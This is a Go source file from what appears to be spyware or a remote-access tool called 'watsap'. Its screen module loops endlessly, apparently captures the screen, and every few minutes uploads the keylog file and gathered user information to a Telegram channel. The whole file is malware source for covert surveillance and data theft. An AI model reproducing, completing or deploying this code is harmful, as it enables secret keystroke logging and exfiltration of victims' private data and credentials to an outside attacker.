package screen

import (
	"log"
	"time"
	"watsap/utils/config"
	"watsap/utils/messages"
	"watsap/utils/telegram"
)

// to-do: try better approach
func LoopScreen() {
	if config.DebugMode {
		log.Printf("[Screen] Starting screenshot plugin")
	}
	for {
		InitScreen()
		telegram.TgSendFile(config.KeylogFile, messages.GetUserInfoMsg())
		if config.DebugMode {
			time.Sleep(1 * time.Minute)
		} else {
			time.Sleep(5 * time.Minute)
		}
	}

}
